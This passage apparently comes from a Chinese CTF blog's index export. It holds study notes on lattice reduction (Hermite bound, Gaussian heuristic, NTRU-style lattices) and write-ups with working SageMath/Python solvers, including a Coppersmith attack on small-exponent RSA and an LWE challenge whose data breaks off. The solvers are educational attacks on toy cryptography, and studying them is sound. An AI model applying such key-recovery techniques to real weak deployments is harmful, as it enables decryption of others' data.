class="number">1</span></span><br><span class="line">        <span class="comment"># 获取flag</span></span><br><span class="line">        <span class="keyword">if</span> kkk != <span class="number">64</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        conn.recvuntil(<span class="string">b&#x27;you find a chest containing &#x27;</span>)</span><br><span class="line">        flag = conn.recvline().decode().strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Flag: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>初窥同源</title>
    <url>/2025/09/11/%E5%88%9D%E7%AA%A5%E5%90%8C%E6%BA%90/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>格の初探</title>
    <url>/2025/01/08/%E6%A0%BC%E3%81%AE%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<p>因为要给招新赛出题，另一方面格的学习也确实该提上日程了ww咕咕了好久(待填坑)</p>
<span id="more"></span>

<p>前面的原理那些我就不多赘述了。和其他师傅写的都大同小异。有很多师傅写的很详细易懂。珠玉在前我就不献丑了</p>
<p>我们直接从hermite定理开始</p>
<h1 id="Hermite’s-Theorem"><a href="#Hermite’s-Theorem" class="headerlink" title="Hermite’s Theorem"></a>Hermite’s Theorem</h1><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535680.png" alt="image-20240521130132678"></p>
<p>以一个简单的ntru为例。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">g = getPrime(<span class="number">128</span>)</span><br><span class="line">h = gmpy2.invert(f+<span class="number">20192020202120222023</span>, p) * g % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">h = 2230300126583677861466927910427460605336142000604400796769019169330805327830058127399640469637301157563524664730082687590109425103649095203274991089542329</span></span><br><span class="line"><span class="string">p = 6950733137747588463708927295050453925761832477377823596882238234496472403054344156839969133381577140118982692621000380716326275220824006196311323447685281</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>目标是求得f。</p>
<p>f′&#x3D;f+20192020202120222023</p>
<p>h&#x3D;invert(f′,p)∗g%p</p>
<p>h&#x3D;f′^(-1)^∗g+kp</p>
<p>g&#x3D;hf′−kp</p>
<h1 id="根据此构造格为-left-begin-array-c-f’-k-end-array-right-left-begin-array-c-1-h-0-p-end-array-right"><a href="#根据此构造格为-left-begin-array-c-f’-k-end-array-right-left-begin-array-c-1-h-0-p-end-array-right" class="headerlink" title="根据此构造格为$$\left(\begin {array}{c}f’ &amp;-k \\end{array}\right)\left(\begin {array}{c}1 &amp;h  \0 &amp;p \\end{array}\right)"></a>根据此构造格为<br>$$<br>\left(\begin {array}{c}<br>f’ &amp;-k \<br>\end{array}\right)<br>\left(\begin {array}{c}<br>1 &amp;h  \<br>0 &amp;p \<br>\end{array}\right)</h1><p>\left(\begin {array}{c}<br>f’ &amp;g \<br>\end{array}\right)<br>$$<br>其中n表示维度，也就是基向量的个数，在本题中n &#x3D; 2</p>
<p>det(L) &#x3D; 行列式的值 &#x3D; 1 * p &#x3D; p.向量v &#x3D; （f’， g）.我们在这里可以存一个测试的板子。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">f = bytes_to_long(flag)</span><br><span class="line"><span class="built_in">print</span>(f.bit_length())  <span class="comment"># 255</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">g = getPrime(<span class="number">128</span>)</span><br><span class="line">g = g</span><br><span class="line"><span class="comment">#固定</span></span><br><span class="line">temp = gmpy2.iroot(<span class="number">2</span> * p, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(temp.bit_length()) <span class="comment"># 257</span></span><br><span class="line"></span><br><span class="line">f = f + <span class="number">20192020202120222023</span>  <span class="comment">#对于bit没有 影响 因为f接近255</span></span><br><span class="line">temp2 = gmpy2.iroot(f**<span class="number">2</span>+(b*g)**<span class="number">2</span>, <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment">#主要在于f g没有太大影响</span></span><br><span class="line"><span class="comment">#此外一定要注意 在python中 ^是异或  **才是平方 </span></span><br><span class="line"><span class="built_in">print</span>(temp2.bit_length())  <span class="comment">#255  乘b = 256</span></span><br></pre></td></tr></table></figure>

<p>最近做题倒是遇到一个hermite定理符合但是仍然无法格基规约的题，一番搜索之后发现了高斯启发式(Gaussian Heuristic)</p>
<p>是一个比hermite更严格的对最短向量长度的定义。</p>
<p><img src="https://ooo.0x0.ooo/2025/03/01/OQgqwl.png" alt="OQgqwl.png"></p>
<p>我们仍然可以根据这个定义写出一个测试demo</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guass_Heuristic</span>(<span class="params">L</span>):</span><br><span class="line">    n = L.nrows()</span><br><span class="line">    efficient = (n/(<span class="number">2</span>*math.pi*math.e))**(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(efficient*iroot(<span class="built_in">abs</span>(L.det()),n)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>大部分情况其实hermite已经够了(我目前遇见的题)，但对于一些卡界比较严格的格，就需要使用高斯启发式对其进行一个更详细的分析。</p>
<h1 id="格相关的题型"><a href="#格相关的题型" class="headerlink" title="格相关的题型"></a>格相关的题型</h1><h2 id="NTRU密码"><a href="#NTRU密码" class="headerlink" title="NTRU密码"></a>NTRU密码</h2><h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">47</span></span><br><span class="line"></span><br><span class="line">f = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">g = getPrime(<span class="number">128</span>)</span><br><span class="line">h = gmpy2.invert(f, p) * g % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">h = 9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443</span></span><br><span class="line"><span class="string">p = 11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>类似上面的ntru构造格的方法。但是直接这么构造是解不出来的，会发现它并不满足hermite定理。我们将数据代入可以得到</p>
<p><img src="https://ooo.0x0.ooo/2025/03/01/OQgTHB.png" alt="OQgTHB.png"></p>
<p>这就涉及到格的配平，这一般是通过同时乘一个大数实现的。我们令b&#x3D;2**256.会发现成立。此时这里的b一般是根据位数进行尝试得到的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">h = <span class="number">9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443</span></span><br><span class="line">p = <span class="number">11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947</span> </span><br><span class="line"></span><br><span class="line">b = <span class="number">2</span>^<span class="number">256</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">Ge = Matrix(ZZ,[[<span class="number">1</span>,b*h],</span><br><span class="line">                [<span class="number">0</span>,b*p]])</span><br><span class="line"><span class="built_in">print</span>(Ge.LLL())</span><br><span class="line">f,g = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = <span class="built_in">abs</span>(f),<span class="built_in">abs</span>(g)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(f)))</span><br></pre></td></tr></table></figure>

<p>这是一道二维的格接下来我们来看一道三维的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;******&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> m.bit_length() == <span class="number">351</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">b = getPrime(<span class="number">1024</span>)</span><br><span class="line">c = getPrime(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">a = (b*m + c) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = ...</span></span><br><span class="line"><span class="string">b = ...</span></span><br><span class="line"><span class="string">p = ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="很明显这里的格我们要构造成-left-begin-array-c-1-m-k-end-array-right-left-begin-array-c-1-0-a-0-1-b-0-0-p-end-array-right"><a href="#很明显这里的格我们要构造成-left-begin-array-c-1-m-k-end-array-right-left-begin-array-c-1-0-a-0-1-b-0-0-p-end-array-right" class="headerlink" title="很明显这里的格我们要构造成$$\left(\begin {array}{c}1 &amp;m &amp;k \\end{array}\right)\left(\begin {array}{c}1 &amp;0 &amp;a  \0 &amp;1 &amp;-b  \0 &amp;0 &amp;p \\end{array}\right)"></a>很明显这里的格我们要构造成<br>$$<br>\left(\begin {array}{c}<br>1 &amp;m &amp;k \<br>\end{array}\right)<br>\left(\begin {array}{c}<br>1 &amp;0 &amp;a  \<br>0 &amp;1 &amp;-b  \<br>0 &amp;0 &amp;p \<br>\end{array}\right)</h1><p>\left(\begin {array}{c}<br>1 &amp;m &amp;c\<br>\end{array}\right)<br>$$<br>我们会发现这个还是不平衡的，仍然要配平。这里有两个方法，将最左上角的1换为2^190^和最后一列乘上2^190^都能解，最终目的就是使其满足hermite定理。</p>
<p>仍然是先进行hermite定理的验证</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="number">2</span> ** <span class="number">0</span>   <span class="comment">#这是不断调整配平用的</span></span><br><span class="line">f = flag = getPrime(<span class="number">351</span>)   </span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">b = getPrime(<span class="number">1024</span>)</span><br><span class="line">c = getPrime(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#行列式维数</span></span><br><span class="line">n = <span class="number">3</span></span><br><span class="line">det = p * <span class="number">2</span>**<span class="number">190</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#行列式的值 大于等于下面的即可</span></span><br><span class="line">temp = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>] * gmpy2.iroot(det, n)[<span class="number">0</span>]  </span><br><span class="line"><span class="built_in">print</span>(temp.bit_length()) </span><br><span class="line"></span><br><span class="line"><span class="comment">#最短向量的值</span></span><br><span class="line">temp2 = gmpy2.iroot(f**<span class="number">2</span>+(c)**<span class="number">2</span>, <span class="number">2</span>)[<span class="number">0</span>]  </span><br><span class="line"><span class="comment">#此外一定要注意 在python中 ^是异或  **才是平方 </span></span><br><span class="line"><span class="built_in">print</span>(temp2.bit_length())  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> temp.bit_length() &gt;= temp2.bit_length():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;true&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;false&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<p><img src="https://ooo.0x0.ooo/2025/03/01/OQgU8s.png" alt="OQgU8s.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = ...</span><br><span class="line">b = ...</span><br><span class="line">p = ...</span><br><span class="line"></span><br><span class="line">Ge = Matrix(ZZ, [[<span class="number">2</span>^<span class="number">190</span>, <span class="number">0</span>, a],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">1</span>, -b],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">0</span>, p]])</span><br><span class="line"></span><br><span class="line">t, m, c = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">m = <span class="built_in">abs</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>相关数学基础知识</title>
    <url>/2024/03/25/%E7%9B%B8%E5%85%B3%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="Rabin攻击"><a href="#Rabin攻击" class="headerlink" title="Rabin攻击"></a>Rabin攻击</h1><span id="more"></span>

<p>首先引出二次剩余和欧拉准则，欧拉准则的证明又设计涉及费马小定理，下面一一说明。</p>
<h2 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>若p为素数，gcd(a,p)&#x3D;1,则$a^{p}$≡a(modp),也可写为$a^{p-1}$≡1(modp).</p>
<h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><h2 id="二次剩余"><a href="#二次剩余" class="headerlink" title="二次剩余"></a>二次剩余</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><ul>
<li><p>若<em>p</em>是素数,a<em>不是p</em>的倍数且与一个平方数模p<em>同余,则称a</em>是模p<em>的二次剩余,记作</em>a<em>∈</em>QR</p>
<p>例如$2^{2}$≡4(mod13) 则称4是模13的二次剩余</p>
<p>同样我们把不等于0也不是模p<em>的二次剩余的数称为非二次剩余,记作a</em>∈<em>NR</em></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>第三届黄河流域网络安全技能挑战赛</title>
    <url>/2025/05/27/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    <content><![CDATA[<p>owo</p>
<p>猛猛学</p>
<span id="more"></span>

<h1 id="1，sandwitch"><a href="#1，sandwitch" class="headerlink" title="1，sandwitch"></a>1，sandwitch</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;fake_flag&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">39</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">pad1 = <span class="string">b&#x27;easy_problem&#x27;</span></span><br><span class="line">pad2 = <span class="string">b&#x27;How_to_solve_it&#x27;</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(pad1 + flag + pad2),e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 130210658110511504736422597261591182174531847806532340762131145212035478695205314931974421838392310731226415266775095601890938846830080329061111533796518633011922277343217149648494987341818402753017296362015915834670450122261511337212801488239810623226740266516836721952886027130703886460578247562781194524199</span></span><br><span class="line"><span class="string">c = 58274335440051115211211273605191310114692293785750437685473044454042062899661976407492451518086227780147882738264722645944582899451063113444881286175099872016956825274378613983870549046907444680021237171113596116147511706486372974792692071549068969896395366667516390709069131700584308236332248449116109156503</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>普通的已知m高低位一把梭</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">n = <span class="number">130210658110511504736422597261591182174531847806532340762131145212035478695205314931974421838392310731226415266775095601890938846830080329061111533796518633011922277343217149648494987341818402753017296362015915834670450122261511337212801488239810623226740266516836721952886027130703886460578247562781194524199</span></span><br><span class="line">c = <span class="number">58274335440051115211211273605191310114692293785750437685473044454042062899661976407492451518086227780147882738264722645944582899451063113444881286175099872016956825274378613983870549046907444680021237171113596116147511706486372974792692071549068969896395366667516390709069131700584308236332248449116109156503</span></span><br><span class="line">i=<span class="number">39</span></span><br><span class="line">prefix = bytes_to_long(<span class="string">b&quot;easy_problem&quot;</span>) * <span class="number">256</span> ** (<span class="number">15</span>  + i)</span><br><span class="line">pad = <span class="string">b&#x27;How_to_solve_it&#x27;</span></span><br><span class="line">low = bytes_to_long(pad)</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (prefix + x * <span class="number">256</span> ** <span class="number">15</span> + low) ** <span class="number">3</span> - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res = f.small_roots(X=<span class="number">256</span> ** i,beta=<span class="number">0.5</span>, epsilon=<span class="number">0.01</span>)</span><br><span class="line"><span class="keyword">if</span> res != []:</span><br><span class="line">    m =<span class="built_in">int</span>(res[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">n = <span class="number">130210658110511504736422597261591182174531847806532340762131145212035478695205314931974421838392310731226415266775095601890938846830080329061111533796518633011922277343217149648494987341818402753017296362015915834670450122261511337212801488239810623226740266516836721952886027130703886460578247562781194524199</span></span><br><span class="line">c = <span class="number">58274335440051115211211273605191310114692293785750437685473044454042062899661976407492451518086227780147882738264722645944582899451063113444881286175099872016956825274378613983870549046907444680021237171113596116147511706486372974792692071549068969896395366667516390709069131700584308236332248449116109156503</span></span><br><span class="line">i=<span class="number">39</span></span><br><span class="line">prefix = bytes_to_long(<span class="string">b&quot;easy_problem&quot;</span>) * <span class="number">256</span> ** (<span class="number">15</span>  + i)</span><br><span class="line">pad = <span class="string">b&#x27;How_to_solve_it&#x27;</span></span><br><span class="line">low = bytes_to_long(pad)</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (prefix + x * <span class="number">256</span> ** <span class="number">15</span> + low) ** <span class="number">3</span> - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res = f.small_roots(X=<span class="number">256</span> ** i,beta=<span class="number">0.5</span>, epsilon=<span class="number">0.01</span>)</span><br><span class="line"><span class="keyword">if</span> res != []:</span><br><span class="line">    m =<span class="built_in">int</span>(res[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="2，Lattice"><a href="#2，Lattice" class="headerlink" title="2，Lattice"></a>2，Lattice</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">q, n, N, sigma</span>):</span><br><span class="line">    t = np.random.randint(<span class="number">0</span>, high=q // <span class="number">2</span>, size=n)</span><br><span class="line">    s = np.concatenate([np.ones(<span class="number">1</span>, dtype=np.int32), t])</span><br><span class="line">    A = np.random.randint(<span class="number">0</span>, high=q // <span class="number">2</span>, size=(N, n))</span><br><span class="line">    e = np.<span class="built_in">round</span>(np.random.randn(N) * sigma**<span class="number">2</span>).astype(np.int32) % q</span><br><span class="line">    b = ((np.dot(A, t) + e).reshape(-<span class="number">1</span>, <span class="number">1</span>)) % q</span><br><span class="line">    P = np.hstack([b, -A])</span><br><span class="line">    <span class="keyword">return</span> P, s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">P, M, q</span>):</span><br><span class="line">    N = P.shape[<span class="number">0</span>]</span><br><span class="line">    n = <span class="built_in">len</span>(M)</span><br><span class="line">    r = np.random.randint(<span class="number">0</span>, <span class="number">2</span>, (n, N))</span><br><span class="line">    Z = np.zeros((n, P.shape[<span class="number">1</span>]), dtype=np.int32)</span><br><span class="line">    Z[:, <span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    C = np.zeros((n, P.shape[<span class="number">1</span>]), dtype=np.int32)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        C[i] = (np.dot(P.T, r[i]) + (np.floor(q / <span class="number">2</span>) * Z[i] * M[i])) % q</span><br><span class="line">    <span class="keyword">return</span> C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = <span class="number">127</span></span><br><span class="line">n = <span class="number">3</span></span><br><span class="line">N = <span class="built_in">int</span>(<span class="number">1.1</span> * n * np.log(q))</span><br><span class="line">sigma = <span class="number">1.0</span></span><br><span class="line"></span><br><span class="line">P, s = gen(q, n, N, sigma)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prep</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> np.array([<span class="built_in">int</span>(b) <span class="keyword">for</span> char <span class="keyword">in</span> s <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">ord</span>(char):08b&#125;</span>&quot;</span>], dtype=np.int32)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C = enc(P, prep(hint), q)</span><br><span class="line">P = P.tolist()</span><br><span class="line">C = C.tolist()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;P=&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;C=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">P=[[87, -27, -52, -29], [57, -41, -24, -60], [76, -17, -55, -37], [75, -46, -33, -21], [121, -55, -33, -34], [47, -4, -34, -45], [112, -33, -44, -16], [74, -44, -5, -25], [20, -21, -16, -49], [89, -21, -54, -24], [18, -23, -53, -1], [35, -40, -4, -29], [105, -54, -2, -8], [44, -24, -43, -36], [111, -15, -15, -54]]</span></span><br><span class="line"><span class="string">C=[[24, 75, 81, 85], [24, 14, 85, 102], [115, 1, 5, 21], [58, 118, 104, 77], [65, 42, 101, 103], [33, 38, 50, 67], [7, 81, 38, 58], [117, 101, 54, 11], [44, 29, 81, 8], [59, 114, 70, 121], [62, 13, 9, 105], [11, 43, 97, 23], [39, 82, 75, 97], [122, 113, 14, 30], [70, 102, 116, 5], [58, 44, 61, 20], [73, 119, 59, 28], [119, 68, 57, 122], [61, 91, 83, 44], [103, 29, 1, 73], [47, 60, 120, 125], [17, 126, 14, 21], [104, 8, 78, 123], [72, 121, 54, 74], [48, 104, 49, 66], [72, 56, 27, 69], [34, 110, 41, 54], [33, 54, 74, 44], [70, 65, 11, 113], [122, 3, 69, 35], [58, 7, 39, 64], [59, 106, 49, 66], [77, 92, 87, 92], [95, 21, 96, 83], [67, 55, 30, 73], [99, 54, 18, 90], [101, 102, 126, 107], [81, 46, 104, 83], [38, 24, 94, 60], [114, 105, 76, 97], [22, 115, 20, 67], [40, 72, 110, 65], [111, 92, 106, 117], [5, 123, 21, 96], [41, 14, 23, 114], [113, 75, 43, 65], [56, 3, 61, 48], [40, 101, 16, 114], [42, 84, 95, 13], [36, 110, 91, 107], [4, 13, 60, 74], [24, 80, 125, 76], [123, 26, 27, 119], [31, 87, 6, 123], [61, 106, 73, 120], [66, 10, 36, 65], [91, 38, 46, 9], [121, 20, 106, 48], [123, 21, 78, 27], [22, 74, 55, 110], [47, 49, 118, 76], [30, 10, 16, 118], [43, 19, 52, 61], [100, 9, 37, 35], [20, 102, 111, 94], [116, 63, 55, 43], [13, 110, 42, 14], [46, 65, 71, 28], [82, 5, 76, 74], [86, 34, 117, 84], [28, 44, 82, 50], [76, 79, 77, 11], [68, 39, 51, 89], [83, 93, 95, 2], [54, 108, 101, 82], [99, 90, 122, 37], [16, 92, 79, 12], [67, 86, 24, 36], [80, 94, 106, 59], [50, 56, 95, 98], [33, 68, 89, 40], [74, 124, 14, 82], [88, 93, 54, 93], [51, 17, 124, 31], [17, 17, 45, 35], [113, 71, 76, 44], [48, 6, 120, 4], [36, 91, 108, 11], [2, 41, 58, 72], [42, 59, 51, 81], [73, 22, 79, 27], [85, 35, 29, 98], [76, 76, 37, 22], [82, 29, 42, 27], [75, 114, 37, 106], [40, 69, 53, 73], [39, 44, 33, 121], [94, 85, 92, 54], [91, 77, 124, 46], [108, 31, 101, 84], [35, 33, 97, 45], [99, 32, 17, 14], [1, 66, 11, 35], [78, 100, 95, 81], [73, 49, 14, 37], [70, 9, 107, 2], [84, 98, 92, 62], [123, 87, 87, 110], [3, 81, 111, 28], [20, 2, 91, 37], [93, 101, 77, 93], [27, 16, 31, 105], [95, 81, 87, 17], [10, 103, 21, 102], [81, 57, 118, 82], [15, 92, 60, 71], [16, 84, 126, 49], [35, 26, 2, 120], [70, 86, 45, 9], [29, 8, 40, 66], [99, 77, 14, 9], [12, 70, 50, 52], [21, 21, 85, 54], [91, 94, 100, 85], [9, 42, 47, 14], [117, 55, 17, 99], [53, 45, 4, 72], [49, 10, 27, 121], [108, 61, 73, 42], [121, 42, 41, 71], [49, 63, 50, 117], [5, 78, 24, 101], [0, 117, 21, 46], [90, 43, 47, 32], [74, 85, 118, 84], [13, 73, 18, 66], [95, 24, 120, 18], [94, 21, 111, 34], [66, 68, 80, 21], [102, 49, 57, 55], [25, 85, 107, 98], [8, 18, 88, 12], [18, 6, 86, 82], [18, 91, 126, 115], [26, 11, 30, 35], [88, 78, 76, 74], [51, 75, 76, 15], [60, 24, 72, 27], [91, 72, 44, 104], [84, 113, 39, 116], [41, 83, 91, 74], [84, 17, 94, 119], [46, 95, 85, 5], [109, 58, 71, 42], [126, 29, 114, 73], [27, 70, 7, 125], [121, 66, 97, 111], [8, 21, 10, 57], [15, 62, 65, 8], [101, 79, 32, 74], [69, 42, 38, 58], [65, 81, 